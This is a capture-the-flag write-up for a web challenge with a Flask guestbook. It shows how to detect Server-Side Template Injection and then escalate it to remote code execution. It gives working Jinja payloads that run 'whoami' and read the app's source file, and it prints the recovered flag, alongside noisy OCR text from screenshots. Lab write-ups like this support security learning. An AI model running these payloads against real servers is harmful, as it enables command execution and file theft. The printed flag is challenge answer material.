# Guestbook (Beta)
> You know what you do!

## About the Challenge
Given a website without the source code, where users can input desired names and the inputted names will be displayed on the website page.


[Image extracted text: secure
OxTelctf zerobyte me 40009/name-test
Guestbook
Your Name?
Welcomel
test
Our honorable visitor.]


In the example above, I tried inputting a name with the value "test" and the result appeared on the website.

## How to Solve?
This website is vulnerable to Server-Side Template Injection (SSTI), which can be demonstrated by inputting `{{7*7}}` in the name parameter, resulting in an output of 49.


[Image extracted text: Not secure
OxTelctfzerobyte me 40009/?name={{7*7}}
Guestbook
Your Name?
Welcomel
49
Our honorable visitor:]


Here, I will attempt further exploitation by performing Remote Code Execution (RCE) through leveraging SSTI. The payload I am using is:

```
{{lipsum.__globals__.os.popen('whoami').read()}}
```


[Image extracted text: Not secure
OxTe/ctfzerobyte me 40009/?name-{{lipsum:_
globals
OS.E
popen(%27whoami%2
Guestbook
Your Name?
Submit
Welcomel
noob
Our honorable visitor.]


It's apparent that the output on the website is "noob," indicating that we've successfully performed Remote Code Execution. The flag's location is within the source code of the Python application. To retrieve the flag, here's the payload I used:

```
{{lipsum.__globals__.os.popen('cat /app/main.py').read()}}
```


[Image extracted text: 9
C
Not secure
view-source OxTe/ctf zerobyte me 40009/?name-%7B%7Blipsum:
globals_
os popen%28%2
(div class=
card mt-5"
style="width: 18rem;
<div
class="
card
body
<h5
class=
card-title" Helcome
<lh5>
<!-- You might influence
its content indirectly
<h6 class="card-subtitle
mb-2
text
success font-monospace fw-bolder">#!/usr/bin/env python3
from flask import Flask,
request,
render_template_string
flag
8#39;ObyteCTF{Th3_MAn_who_Thlnks_h3_CAn_And_th3_M4n_who_Thlnks_h3_(Ant_4r3
BOth_Rlght}&#39;
app
Flask(
name
[04io.
60430]


```
0byteCTF{Th3_M4n_wh0_Th1nks_h3_C4n_4nd_th3_M4n_wh0_Th1nks_h3_C4nt_4r3_B0th_R1ght}
```